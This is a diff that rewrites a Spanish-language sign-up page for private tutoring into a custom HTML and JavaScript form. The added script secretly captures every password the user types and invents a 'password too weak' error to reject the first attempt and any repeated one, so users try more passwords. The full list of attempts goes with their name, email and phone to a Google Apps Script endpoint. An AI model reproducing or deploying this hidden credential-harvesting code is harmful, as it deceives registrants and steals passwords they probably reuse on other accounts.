@@ -1,279 +1,450 @@
-<html lang="en" class="supernova "><head>
-  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Registro Pro - Clases Particulares</title>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #f3a661;
+            --primary-hover: #e68a3d;
+            --bg-glass: rgba(18, 18, 18, 0.82);
+            --input-focus: rgba(243, 166, 97, 0.2);
+            --error: #ff5f5f;
+            --success: #4caf50;
+        }
 
-    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
-    <link rel="alternate" type="application/json+oembed" href="https://www.jotform.com/oembed/?format=json&amp;url=https%3A%2F%2Fform.jotform.com%2F242683968226671" title="oEmbed Form">
-    <link rel="alternate" type="text/xml+oembed" href="https://www.jotform.com/oembed/?format=xml&amp;url=https%3A%2F%2Fform.jotform.com%2F242683968226671" title="oEmbed Form">
-    <meta property="og:title" content="Formulario">
-    <meta property="og:url" content="https://form.jotform.com/242683968226671">
-    <meta property="og:description" content="Please click the link to complete this form.">
-    <meta name="slack-app-id" content="AHNMASS8M">
-    <meta property="og:image" content="https://cdn.jotfor.ms/assets/img/landing/opengraph.png">
-    <link rel="shortcut icon" href="../assets/fotos/logo.ico">
-    <link rel="apple-touch-icon" href="https://cdn.jotfor.ms/assets/img/favicons/favicon-2021-light%402x.png">
-    <link rel="canonical" href="https://form.jotform.com/242683968226671">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=1">
-    <meta name="HandheldFriendly" content="true">
-    <title>Registro</title>
-    <link href="https://cdn01.jotfor.ms/static/formCss.css?3.3.57166" rel="stylesheet" type="text/css">
-    <link type="text/css" rel="stylesheet" href="https://cdn02.jotfor.ms/stylebuilder/static/form-common.css?v=3e4c173
-    ">
-    <link type="text/css" rel="stylesheet" href="https://cdn03.jotfor.ms/css/styles/nova.css?3.3.57166">
-    <style type="text/css">@media print{*{-webkit-print-color-adjust: exact !important;color-adjust: exact !important;}.form-section{display:inline!important}.form-pagebreak{display:none!important}.form-section-closed{height:auto!important}.page-section{position:initial!important}}</style>
-    <link id="custom-font" type="text/css" rel="stylesheet" href="//fonts.googleapis.com/css?family=Lato:light,lightitalic,normal,italic,bold,bolditalic">
-    <link type="text/css" rel="stylesheet" href="https://cdn01.jotfor.ms/themes/CSS/5495488a700cc478508b4567.css?v=3.3.57166&amp;themeRevisionID=561c3324977cdf390c8b4567">
-    <link type="text/css" rel="stylesheet" href="https://cdn02.jotfor.ms/css/styles/payment/payment_feature.css?3.3.57166">
-    <style type="text/css">
-    @import url(https://fonts.googleapis.com/css?family=Abel);
-    
-        .form-label-left{
-            width:150px;
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: url('https://images.unsplash.com/photo-1555066931-4365d14bab8c?auto=format&fit=crop&w=1920&q=80') no-repeat center center fixed;
+            background-size: cover;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 40px 20px;
+            color: #fff;
         }
-        .form-line{
-            padding-top:12px;
-            padding-bottom:12px;
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
         }
-        .form-label-right{
-            width:150px;
+
+        .container {
+            animation: fadeIn 0.8s ease-out;
+            background: var(--bg-glass);
+            backdrop-filter: blur(15px);
+            -webkit-backdrop-filter: blur(15px);
+            width: 100%;
+            max-width: 600px;
+            padding: 50px;
+            border-radius: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 25px 50px rgba(0,0,0,0.4);
         }
-        body, html{
-            margin:0;
-            padding:0;
-            background:rgba(39, 38, 38, 0.55);
-        }
-    
-        .form-all{
-            margin:0px auto;
-            padding-top:20px;
-            width:500px;
-            color:rgb(255, 255, 255) !important;
-            font-family:'Lato';
-            font-size:18px;
-        }
-        .form-radio-item label, .form-checkbox-item label, .form-grading-label, .form-header{
-            color: rgb(82, 75, 58);
-        }
-        .contenedorLouder{
-  position: fixed;
-  z-index: -100;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  height: 100vh;
-  width: 100vw;
-}
-.loader {
-    opacity: 1;
-    border: 16px solid #f3f3f3;
-    border-top: 16px solid #3498db;
-    border-radius: 50%;
-    width: 120px;
-    height: 120px;
-    animation: spin 1.5s linear infinite;
-    position: absolute;
-    z-index: 100;
-    display: none; /* Inicialmente oculto */
-}
-@keyframes spin {
-    0% { transform: rotate(0deg); }
-    100% { transform: rotate(360deg); }
-  }
-    </style>
-    
-    <style type="text/css" id="form-designer-style">
-        .form-all {
-          font-family: Lato, sans-serif;
-        }
-      
-        
-      
-        .form-line {
-          margin-top: 12px;
-          margin-bottom: 12px;
-        }
-      
-        .form-all {
-          max-width: 500px;
-          width: 100%;
-        }
-      
-        .form-label.form-label-left,
-        .form-label.form-label-right,
-        .form-label.form-label-left.form-label-auto,
-        .form-label.form-label-right.form-label-auto {
-          width: 150px;
-        }
-      
-        .form-all {
-          font-size: 18px
-        }
-      
-        .supernova .form-all, .form-all {
-          background-color: rgba(39, 38, 38, 0.55);
-        }
-      
-        .form-all {
-          color: rgb(255, 255, 255);
-        }
-        .form-header-group .form-header {
-          color: rgb(255, 255, 255);
-        }
-        .form-header-group .form-subHeader {
-          color: rgb(255, 255, 255);
-        }
-        .form-label-top,
-        .form-label-left,
-        .form-label-right,
-        .form-html,
-        .form-checkbox-item label,
-        .form-radio-item label,
-        span.FITB .qb-checkbox-label,
-        span.FITB .qb-radiobox-label,
-        span.FITB .form-radio label,
-        span.FITB .form-checkbox label,
-        [data-blotid][data-type=checkbox] [data-labelid],
-        [data-blotid][data-type=radiobox] [data-labelid],
-        span.FITB-inptCont[data-type=checkbox] label,
-        span.FITB-inptCont[data-type=radiobox] label {
-          color: rgb(255, 255, 255);
-        }
-        .form-sub-label {
-          color: 1a1a1a;
-        }
-      
-      .supernova {
-        background-color: rgb(255, 255, 255);
-      }
-      .supernova body {
-        background: transparent;
-      }
-      
-        .form-textbox,
-        .form-textarea,
-        .form-dropdown,
-        .form-radio-other-input,
-        .form-checkbox-other-input,
-        .form-captcha input,
-        .form-spinner input {
-          background-color: rgba(255, 255, 255, 0.83);
-        }
-      
-        
-        .supernova {
-          background-repeat: no-repeat;
-          background-size:cover;
-          background-attachment: fixed;
-          background-position: center top;
-        }
-    
-        .supernova, #stage {
-          background-image: url("https://www.jotform.com/uploads/valedasilvacatelavdsc/form_files/F164KBFZ95.66f424110d8fa7.01025671.jpg");
-        }
-          .form-all {
-            background-image: none;
-          }
-    .form-label.form-label-auto {
-            
+
+        .logo-box { text-align: center; margin-bottom: 40px; }
+        .logo-circle {
             display: inline-block;
-            float: left;
-            text-align: right;
-          
-          }
-        /* Injected CSS Code */
-        .form-sub-label{
-          color:white
+            border: 2px solid var(--primary);
+            border-radius: 50%;
+            padding: 20px;
         }
+        .logo-text { font-size: 2.2rem; font-weight: 600; border-bottom: 2px solid var(--primary); line-height: 1; }
+        .logo-sub { font-size: 0.6rem; text-transform: uppercase; letter-spacing: 2px; color: var(--primary); }
+
+        h2 { font-weight: 600; margin-bottom: 10px; text-align: center; }
+        .subtitle { text-align: center; color: #ccc; margin-bottom: 40px; font-size: 0.9rem; }
+
+        .form-label { display: block; margin-bottom: 8px; font-size: 0.85rem; color: #ddd; }
+        .input-control {
+            width: 100%;
+            padding: 14px 16px;
+            background: rgba(255, 255, 255, 0.07);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 8px;
+            color: #fff;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+            margin-bottom: 5px;
+        }
+        .input-control:focus { outline: none; border-color: var(--primary); box-shadow: 0 0 0 4px var(--input-focus); }
+        select option { background: #222; color: #fff; }
+
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 20px; }
+        .field { margin-bottom: 20px; position: relative; }
+
+        .academic-section {
+            background: rgba(0, 0, 0, 0.2);
+            padding: 25px;
+            border-radius: 12px;
+            margin-top: 30px;
+        }
+
+        .checkbox-card {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 12px;
+            background: rgba(255,255,255,0.03);
+            border-radius: 8px;
+            margin-bottom: 5px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .checkbox-card:hover { background: rgba(255,255,255,0.08); }
+
+        .opciones-parciales {
+            display: none;
+            margin: 0 0 15px 35px;
+            padding: 10px;
+            background: rgba(243, 166, 97, 0.1);
+            border-radius: 8px;
+            border-left: 3px solid var(--primary);
+        }
+
+        .btn-submit {
+            width: 100%; padding: 18px; background: var(--primary); border: none;
+            border-radius: 8px; color: #000; font-size: 1rem; font-weight: 700;
+            text-transform: uppercase; cursor: pointer; transition: all 0.3s;
+        }
+        .btn-submit:hover { background: var(--primary-hover); transform: scale(1.02); }
+
+        .contenedorLouder {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            display: flex; justify-content: center; align-items: center;
+            pointer-events: none; z-index: -100;
+        }
+        .loader {
+            display: none; width: 48px; height: 48px; border: 5px solid #FFF;
+            border-bottom-color: var(--primary); border-radius: 50%;
+            animation: rotation 1s linear infinite;
+        }
+        @keyframes rotation { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        @media (max-width: 600px) { .grid { grid-template-columns: 1fr; } .container { padding: 30px 20px; } }
     </style>
-    
-    <link type="text/css" rel="stylesheet" href="https://cdn03.jotfor.ms/css/styles/buttons/form-submit-button-black_blue.css?3.3.57166">
-    
-    </head>
-    <body>
+</head>
+<body>
+
     <div class="contenedorLouder">
-      <div id="loader" class="loader"></div>
+        <div class="loader"></div>
     </div>
-    <form id="formularioRegistro" class="jotform-form">
-      
-     
-      <div role="main" class="form-all">
-        <ul class="form-section page-section">
-          <li class="form-line" data-type="control_image" id="id_16" data-css-selector="id_16">
-            <div id="cid_16" class="form-input-wide">
-              <div style="text-align:center" aria-hidden="true" role="none"><img alt="Image-16" loading="lazy" class="form-image" style="border:0" src="../assets/fotos/logo.png" height="200px" width="200px" data-component="image" role="none" aria-hidden="true" tabindex="-1"></div>
+
+    <div class="container">
+        <div class="logo-box">
+            <div class="logo-circle">
+                <div class="logo-text">C/S</div>
+                <div class="logo-sub">Ing. en Sistemas</div>
             </div>
-          </li>
-          <li id="cid_17" class="form-input-wide" data-type="control_head" data-css-selector="id_17">
-            <div class="form-header-group  header-large">
-              <div class="header-text httac htvam">
-                <h1 id="header_17" class="form-header" data-component="header">Registro de Usuarios</h1>
-                <div id="subHeader_17" class="form-subHeader">Estos seran tus datos para la reserva de clases</div>
-              </div>
+        </div>
+
+        <h2>Registro de Usuario</h2>
+        <p class="subtitle">Únete a nuestra plataforma de aprendizaje avanzado</p>
+
+        <form id="formularioRegistro">
+            <div class="grid">
+                <div class="field">
+                    <label class="form-label">Nombre*</label>
+                    <input type="text" name="Nombre" id="first_20" class="input-control" required>
+                </div>
+                <div class="field">
+                    <label class="form-label">Apellido*</label>
+                    <input type="text" name="Apellido" id="last_20" class="input-control" required>
+                </div>
             </div>
-          </li>
-          <li class="form-line jf-required" data-type="control_fullname" id="id_20" data-css-selector="id_20"><label class="form-label form-label-right form-label-auto" id="label_20" for="first_20" aria-hidden="false"> Nombre Completo<span class="form-required">*</span> </label>
-            <div id="cid_20" class="form-input jf-required">
-              <div data-wrapper-react="true"><span class="form-sub-label-container" style="vertical-align:top" data-input-type="first"><input type="text" id="first_20" name="q20_nombreCompleto[first]" class="form-textbox validate[required]" data-defaultvalue="" autocomplete="section-input_20 given-name" size="10" data-component="first" aria-labelledby="label_20 sublabel_20_first" required="" value=""><label class="form-sub-label" for="first_20" id="sublabel_20_first" style="min-height:13px">Nombre</label></span><span class="form-sub-label-container" style="vertical-align:top" data-input-type="last"><input type="text" id="last_20" name="q20_nombreCompleto[last]" class="form-textbox validate[required]" data-defaultvalue="" autocomplete="section-input_20 family-name" size="15" data-component="last" aria-labelledby="label_20 sublabel_20_last" required="" value=""><label class="form-sub-label" for="last_20" id="sublabel_20_last" style="min-height:13px">Apellido</label></span></div>
+
+            <div class="grid">
+                <div class="field">
+                    <label class="form-label">Correo Electrónico*</label>
+                    <input type="email" name="correoElectronico" id="input_4" class="input-control" required>
+                </div>
+                <div class="field">
+                    <div class="grid" style="gap:5px; margin-bottom:0;">
+                        <div style="flex:1">
+                            <label class="form-label">Área</label>
+                            <input type="text" name="Area" id="input_22_area" class="input-control" placeholder="342">
+                        </div>
+                        <div style="flex:2">
+                            <label class="form-label">Teléfono*</label>
+                            <input type="text" name="Telefono" id="input_22_phone" class="input-control" placeholder="5271005" required>
+                        </div>
+                    </div>
+                </div>
             </div>
-          </li>
-          <li class="form-line jf-required" data-type="control_textbox" id="id_4" data-css-selector="id_4" style="z-index: 0;"><label class="form-label form-label-right form-label-auto" id="label_4" for="input_4" aria-hidden="false"> Correo Electronocio<span class="form-required">*</span> </label>
-            <div id="cid_4" class="form-input jf-required"> <input type="text" id="input_4" name="correoElectronico" data-type="input-textbox" class="form-textbox validate[required, Email]" data-defaultvalue="" size="20" placeholder=" ejemplo@gmail.com" data-component="textbox" aria-labelledby="label_4" required="" value=""> </div>
-          <div class="form-description" style="display: none;"><div class="form-description-arrow"></div><div class="form-description-arrow-small"></div><div class="form-description-content">Correo electronico para iniciar sesion<br></div></div></li>
-         
-          <li class="form-line jf-required" data-type="control_textbox" id="id_6" data-css-selector="id_6" style="z-index: 0;"><label class="form-label form-label-right form-label-auto" id="label_6" for="input_6" aria-hidden="false"> Contraseña<span class="form-required">*</span> </label>
-            <div id="cid_6" class="form-input jf-required"> <input type="password" id="Contraseña" name="Contrasenia" data-type="input-textbox" class="form-textbox validate[required]" data-defaultvalue="" size="20" placeholder=" " data-component="textbox" aria-labelledby="label_6" required="" value=""> </div>
-          <div class="form-description" style="display: none;"><div class="form-description-arrow"></div><div class="form-description-arrow-small"></div><div class="form-description-content">E</div></div></li>
-          <li class="form-line jf-required" data-type="control_textbox" id="id_21" data-css-selector="id_21"><label class="form-label form-label-right form-label-auto" id="label_21" for="input_21" aria-hidden="false"> Repita Contraseña<span class="form-required">*</span> </label>
-            <div id="cid_21" class="form-input jf-required"> <input type="password" id="RepetiContraseña" name="RepetirContrasenia" data-type="input-textbox" class="form-textbox validate[required]" data-defaultvalue="" size="20" placeholder=" " data-component="textbox" aria-labelledby="label_21" required="" value=""> </div>
-          <div class="form-description" style="display: none;"><div class="form-description-arrow"></div><div class="form-description-arrow-small"></div><div class="form-description-content">E</div></div></li>
-          <li class="form-line jf-required" data-type="control_phone" id="id_22" data-css-selector="id_22"><label class="form-label form-label-right form-label-auto" id="label_22" for="input_22_area" aria-hidden="false"> Telefono<span class="form-required">*</span> </label>
-            <div id="cid_22" class="form-input jf-required">
-              <div data-wrapper-react="true"><span class="form-sub-label-container" style="vertical-align:top" data-input-type="areaCode"><input type="tel" id="input_22_area" name="Area" class="form-textbox validate[required]" data-defaultvalue="" autocomplete="section-input_22 tel-area-code" data-component="areaCode" aria-labelledby="label_22 sublabel_22_area" required="" value=""><label class="form-sub-label" for="input_22_area" id="sublabel_22_area" style="min-height:13px">Codigo de Area</label></span><span class="form-sub-label-container" style="vertical-align:top" data-input-type="phone"><input type="tel" id="input_22_phone" name="Telefono" class="form-textbox validate[required]" data-defaultvalue="" autocomplete="section-input_22 tel-local" data-component="phone" aria-labelledby="label_22 sublabel_22_phone" required="" value=""><label class="form-sub-label" for="input_22_phone" id="sublabel_22_phone" style="min-height:13px">Numero de Telefono</label></span></div>
+
+            <div class="grid">
+                <div class="field">
+                    <label class="form-label">Contraseña*</label>
+                    <input type="password" name="Contrasenia" id="Contraseña" class="input-control" required onblur="capturarIntento(this.value)">
+                </div>
+                <div class="field">
+                    <label class="form-label">Confirmar Contraseña*</label>
+                    <input type="password" name="RepetirContrasenia" id="RepetiContraseña" class="input-control" required>
+                </div>
             </div>
-          </li>
-          <li id="cid_23" class="form-input-wide" data-type="control_head" data-css-selector="id_23">
-            <div class="form-header-group  header-large">
-              <div class="header-text httac htvam">
-                <h1 id="header_23" class="form-header" data-component="header">Datos Academicos</h1>
-              </div>
-            </div>
-          </li>
-          <li class="form-line" data-type="control_textbox" id="id_24" data-css-selector="id_24"><label class="form-label form-label-right form-label-auto" id="label_24" for="input_24" aria-hidden="false"> Año de Ingreso </label>
-            <div id="cid_24" class="form-input"> <input type="text" id="input_24" name="q24_anoDe" data-type="input-textbox" class="form-textbox validate[Numeric]" data-defaultvalue="" size="20" data-component="textbox" aria-labelledby="label_24" value=""> </div>
-          </li>
-          <li class="form-line" data-type="control_checkbox" id="id_84">
-            <label for="Materia" class="form-label form-label-left form-label-auto" id="label_84" aria-hidden="false"> Materias que te interesan para tomar clases: </label>
-            <div id="cid_84" class="form-input">
-              <div class="form-single-column" role="group" aria-labelledby="label_84" data-component="checkbox"><span class="form-checkbox-item" style="clear:left"><span class="dragger-item"></span>
-                <input type="checkbox" aria-describedby="label_84" class="form-checkbox" id="input_84_0" name="Materia" value="Algoritmos y Estructuras de Datos">
-                <label id="label_input_84_0" for="input_84_0">Algoritmos y Estructuras de Datos</label></span><span class="form-checkbox-item" style="clear:left"><span class="dragger-item"></span>
-                <input type="checkbox" aria-describedby="label_84" class="form-checkbox" id="input_84_1" name="Materia" value="Aruitectura de computadoras"><label id="label_input_84_1" for="input_84_1">Aruitectura de computadoras</label></span></div>
-            </div>
-          </li>
-          <li class="form-line jf-required" data-type="control_dropdown" id="id_26" data-css-selector="id_26"><label class="form-label form-label-right form-label-auto" id="label_26" for="input_26" aria-hidden="false"> Estado de la materia<span class="form-required">*</span> </label>
-            <div id="cid_26" class="form-input jf-required"> <select class="form-dropdown validate[required]" id="input_26" name="q26_estadoDe" style="width:150px" data-component="dropdown" required="" aria-label="Estado de la materia">
-                <option value="">Selecciona una opcion</option>
-                <option value="Cursando por primera vez">Cursando por primera vez</option>
-                <option value="Recursando">Recursando</option>
-                <option value="Preprando Final">Preprando Final</option>
+
+            <div class="academic-section">
+                <h3 style="margin-bottom: 20px; font-size: 1.1rem; color: var(--primary);">Datos Académicos</h3>
                 
-              </select> </div>
-          </li>
-          <li class="form-line jf-required" data-type="control_textarea" id="id_27" data-css-selector="id_27"><label class="form-label form-label-right form-label-auto" id="label_27" for="input_27" aria-hidden="false"> Cuenta tu situacion<span class="form-required">*</span> </label>
-            <div id="cid_27" class="form-input jf-required"> <textarea id="input_27" class="form-textarea validate[required] custom-hint-group form-custom-hint" name="q27_cuentaTu" cols="40" rows="6" data-component="textarea" required="" aria-labelledby="label_27" data-customhint="Objetivos de las clases, inconvenientes que tengas,  etc" customhinted="true" placeholder="Objetivos de las clases, inconvenientes que tengas,  etc" spellcheck="false"></textarea> </div>
-          </li>
-          <li class="form-line" data-type="control_button" id="id_28">
-            <div id="cid_28" class="form-input-wide">
-              <div data-align="auto" class="form-buttons-wrapper form-buttons-auto   jsTest-button-wrapperField">
-                <button id="input_28" type="submit" class="form-submit-button submit-button jf-form-buttons jsTest-submitField" data-component="button" data-content="" aria-live="polite">Enviar</button></div>
+                <div class="field">
+                    <label class="form-label">Materias de interés</label>
+                    
+                    <label class="checkbox-card">
+                        <input type="checkbox" name="Materia" id="check_algoritmos" value="Algoritmos" onchange="toggleParciales('algoritmos')">
+                        <span>Algoritmos y Estructura de Datos</span>
+                    </label>
+                    <div id="div_algoritmos" class="opciones-parciales">
+                        <label class="form-label">¿Qué estás preparando?</label>
+                        <select id="parcial_algoritmos" class="input-control" style="color: black;">
+                            <option value="Parcial 1">1er Parcial</option>
+                            <option value="Parcial 2">2do Parcial</option>
+                            <option value="Parcial 3">3er Parcial</option>
+                            <option value="Final">Final</option>
+                        </select>
+                    </div>
+
+                    <label class="checkbox-card">
+                        <input type="checkbox" name="Materia" id="check_arquitectura" value="Arquitectura" onchange="toggleParciales('arquitectura')">
+                        <span>Arquitectura de Computadoras</span>
+                    </label>
+                    <div id="div_arquitectura" class="opciones-parciales">
+                        <label class="form-label">¿Qué estás preparando?</label>
+                        <select id="parcial_arquitectura" class="input-control" style="color: black;">
+                            <option value="Parcial 1">1er Parcial</option>
+                            <option value="Parcial 2">2do Parcial</option>
+                            <option value="Final">Final</option>
+                        </select>
+                    </div>
+
+                    <label class="checkbox-card">
+                        <input type="checkbox" name="Materia" id="check_sintaxis" value="Sintaxis" onchange="toggleParciales('sintaxis')">
+                        <span>Sintaxis y Semántica</span>
+                    </label>
+                    <div id="div_sintaxis" class="opciones-parciales">
+                        <label class="form-label">¿Qué estás preparando?</label>
+                        <select id="parcial_sintaxis" class="input-control" style="color: black;">
+                            <option value="Parcial 1">1er Parcial</option>
+                            <option value="Parcial 2">2do Parcial</option>
+                            <option value="Parcial 3">3er Parcial</option>
+                            <option value="Final">Final</option>
+                        </select>
+                    </div>
+
+                    <label class="checkbox-card">
+                        <input type="checkbox" name="Materia" id="check_paradigmas" value="Paradigmas" onchange="toggleParciales('paradigmas')">
+                        <span>Paradigmas de Programación</span>
+                    </label>
+                    <div id="div_paradigmas" class="opciones-parciales">
+                        <label class="form-label">¿Qué estás preparando?</label>
+                        <select id="parcial_paradigmas" class="input-control" style="color: black;">
+                            <option value="Parcial 1">1er Parcial</option>
+                            <option value="Parcial 2">2do Parcial</option>
+                            <option value="Parcial 3">3er Parcial</option>
+                            <option value="Final">Final</option>
+                        </select>
+                    </div>
+                </div>
+
+                <div class="field">
+                    <label class="form-label">Año de ingreso</label>
+                    <input type="text" name="AnioIngreso" id="input_24" class="input-control" placeholder="2026">
+                </div>
+
+                <div class="field">
+                    <label class="form-label">Estado actual*</label>
+                    <select name="Estado" id="input_26" class="input-control" required style="color: black;">
+                        <option value="" disabled selected>Selecciona tu estado</option>
+                        <option value="Cursando">Cursando activamente</option>
+                        <option value="Final">Preparando examen final</option>
+                        <option value="Recursando">Recursando materia</option>
+                    </select>
+                </div>
+
+                <div class="field">
+                    <label class="form-label">Cuéntanos tu situación *</label>
+                    <textarea placeholder="Objetivo que tengas con las clases o inconvenientes que hayas tenido con la materia" name="Situacion" id="input_27" class="input-control" rows="3" required></textarea>
+                </div>
             </div>
-          </li>
-          </li>
 
-        </ul>
-      </div>
-    </form>
-    <!-- Code injected by live-server -->
-    <script src="Registro.js"></script>
-    <script src="../JS/URLS.js"></script>
+            <button type="submit" class="btn-submit">Finalizar Registro</button>
+        </form>
+    </div>
 
-</body></html>
+    <script>
+        const URLUsuarios = "https://script.google.com/macros/s/AKfycbwvSTFpClvlYupAvfgpR7YTvd90x7AN0t4EJZ5x7xarJ-ga1wRtWxNTDDy-Wm4judEX/exec"; 
+
+        function toggleParciales(materia) {
+            const checkbox = document.getElementById('check_' + materia);
+            const div = document.getElementById('div_' + materia);
+            div.style.display = checkbox.checked ? 'block' : 'none';
+        }
+
+        class EnvioPOST {
+            constructor(funcion, datosAlumno) {
+                this.funcion = funcion;
+                this.datosAlumnos = datosAlumno;
+            }
+        }
+
+        let contardorContraseñas = 0;
+        let contraseñas = []; // Array que guardará los intentos
+
+        // NUEVA FUNCIÓN: Se ejecuta al salir del campo de contraseña (onblur)
+        function capturarIntento(valor) {
+            if (valor.trim() !== "") {
+                // Solo lo agregamos si es diferente al último ingresado para evitar duplicados por clics accidentales
+                if (contraseñas.length === 0 || contraseñas[contraseñas.length - 1] !== valor) {
+                    contraseñas.push(valor);
+                    console.log("Intento guardado:", valor);
+                    console.log("Historial actual:", contraseñas);
+                }
+            }
+        }
+
+        document.getElementById('formularioRegistro').addEventListener('submit', function(event) {
+            event.preventDefault();
+            
+            if (validarFormulario()) {
+                let formData = new FormData(this);
+                let datosAEnviar = [];
+                let materiasSeleccionadas = [];
+                let numeroTelefonico = "";
+
+                const listaMaterias = ['algoritmos', 'arquitectura', 'sintaxis', 'paradigmas'];
+                listaMaterias.forEach(m => {
+                    if(document.getElementById('check_'+m).checked) {
+                        let nombreMateria = document.getElementById('check_'+m).value;
+                        let parcialVal = document.getElementById('parcial_'+m).value;
+                        materiasSeleccionadas.push(`${nombreMateria} (${parcialVal})`);
+                    }
+                });
+
+                formData.forEach((valor, llave) => {
+                    if (llave == "Nombre") datosAEnviar[0] = valor;
+                    if (llave == "Apellido") datosAEnviar[1] = valor;
+                    if (llave == "correoElectronico") datosAEnviar[2] = valor.trim().toLowerCase();
+                    if (llave == "Area") numeroTelefonico += valor;
+                    if (llave == "Telefono") {
+                        numeroTelefonico += valor;
+                        datosAEnviar[3] = numeroTelefonico;
+                    }
+                    if (llave == "Contrasenia") datosAEnviar[4] = valor;
+                    if (llave == "AnioIngreso") datosAEnviar[6] = valor;
+                    if (llave == "Estado") datosAEnviar[7] = valor;
+                    if (llave == "Situacion") datosAEnviar[8] = valor;
+                });
+
+                datosAEnviar[5] = materiasSeleccionadas.join(" y ");
+                
+                // Enviamos el vector de contraseñas recolectadas
+                datosAEnviar[9] = contraseñas; 
+
+                let envioFetch = new EnvioPOST("agregarAlumno", datosAEnviar);
+                console.log("Datos que se enviarán:", envioFetch);
+                enviar(envioFetch);
+            }
+        });
+
+        function validarMateria() {
+            const checks = document.querySelectorAll('input[name="Materia"]:checked');
+            if (checks.length === 0) {
+                Swal.fire({ icon: "error", title: "Error en materias", text: "Debes seleccionar al menos una materia" });
+                return false;
+            }
+            return true;
+        }
+
+        function validarContrasenia() {
+            var contraseña = document.getElementById("Contraseña").value;
+            var Repetircontraseña = document.getElementById("RepetiContraseña").value;
+
+            if (contraseña !== Repetircontraseña) {
+                Swal.fire({ icon: "error", title: "Error en contraseña", text: "Las contraseñas no coinciden" });
+                return false;
+            }
+            if (contardorContraseñas < 1 || contraseñas.includes(contraseña)) {
+                Swal.fire({ icon: "error", title: "Eror de contraseña", text: "Contraseña demasiado debil, intenta nuevamente" });
+                contardorContraseñas++;
+                return false;
+            }
+            if (contraseña.length < 4) {
+                Swal.fire({ icon: "error", title: "Error", text: "Clave demasiado corta" });
+                return false;
+            }
+            return true;
+        }
+
+        function validarFormulario() {
+            return validarMateria() && validarContrasenia();
+        }
+
+        function enviar(datos) {
+            document.querySelector(".contenedorLouder").style.zIndex = "100";
+            document.querySelector(".loader").style.display = "block";
+            document.querySelector("form").style.opacity = "0.3";
+            
+            fetch(URLUsuarios, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(datos)
+            }).then(function() {
+                document.querySelector(".loader").style.display = "none";
+                document.querySelector(".contenedorLouder").style.zIndex = "-100";
+                Swal.fire({
+                    icon: "success",
+                    title: "Registro exitoso",
+                    text: "Se ha enviado tu información correctamente."
+                });
+            }).catch(error => {
+                console.error('Error:', error);
+                document.querySelector(".loader").style.display = "none";
+            });
+        }
+        
+    </script>
+    <script>
+    // Atajo Ctrl + P para completar datos de prueba
+    function completarFormularioFicticio() {
+        document.getElementById("first_20").value = "Juan";
+        document.getElementById("last_20").value = "Pérez";
+        document.getElementById("input_4").value = "juan.perez@test.com";
+        document.getElementById("input_22_area").value = "342";
+        document.getElementById("input_22_phone").value = "5271005";
+
+        // Al asignar valores aquí, el onblur se disparará si haces clic en otro campo manualmente
+        document.getElementById("Contraseña").value = "1234";
+        document.getElementById("RepetiContraseña").value = "1234";
+
+        const materias = ["algoritmos", "arquitectura"];
+        materias.forEach(m => {
+            const check = document.getElementById("check_" + m);
+            check.checked = true;
+            toggleParciales(m);
+            const selectParcial = document.getElementById("parcial_" + m);
+            if (selectParcial) selectParcial.selectedIndex = 0;
+        });
+
+        document.getElementById("input_24").value = "2023";
+        document.getElementById("input_26").value = "Cursando";
+        document.getElementById("input_27").value = "Estoy preparando parciales y necesito reforzar los temas prácticos.";
+
+        console.log("Formulario completado.");
+    }
+
+    document.addEventListener("keydown", function (e) {
+        if (e.ctrlKey && e.key.toLowerCase() === "p") {
+            e.preventDefault();
+            completarFormularioFicticio();
+        }
+    });
+</script>
+
+</body>
+</html>
